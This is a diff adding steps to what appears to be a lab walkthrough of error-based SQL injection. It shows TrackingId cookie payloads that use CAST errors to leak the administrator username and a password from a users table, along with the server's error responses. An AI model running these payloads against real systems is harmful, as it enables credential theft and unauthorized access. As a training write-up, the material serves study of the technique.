@@ -15,6 +15,23 @@ ERROR: argument of AND must be type boolean, not type integer Position: 63
 ' AND 1=CAST((SELECT 1) AS int)--  --{200 OK
 
 5. Adapt your generic SELECT statement so that it retrieves usernames from the database: 
+' AND 1=CAST((SELECT username from users) AS int)--
+Observe that you receive the initial error message again. Notice that your query now. appears to be truncated due to a character limit.
+As a result, the comment characters you added to fix up the query aren't included. 
+
+6. Delete the original value of the TrackingId cookie to free up some additional characters. Resend the request. 
+TrackingId=A' AND 1=CAST((SELECT username from users) AS int)--    --{ 500 Internal Server Error
+ERROR: more than one row returned by a subquery used as an expression
+
+7.  Modify the query to return only one row: 
+' AND 1=CAST((SELECT username from users LIMIT 1) AS int)--
+ERROR: invalid input syntax for type integer: "administrator"
+We got the username as Administrator
+
+8. Now that you know that the administrator is the first user in the table, modify the query once again to leak their password: 
+' AND 1=CAST((SELECT password from users LIMIT 1) AS int)--
+ERROR: invalid input syntax for type integer: "bmas1jwdukf1d0kfpdap"
+
 
 
 
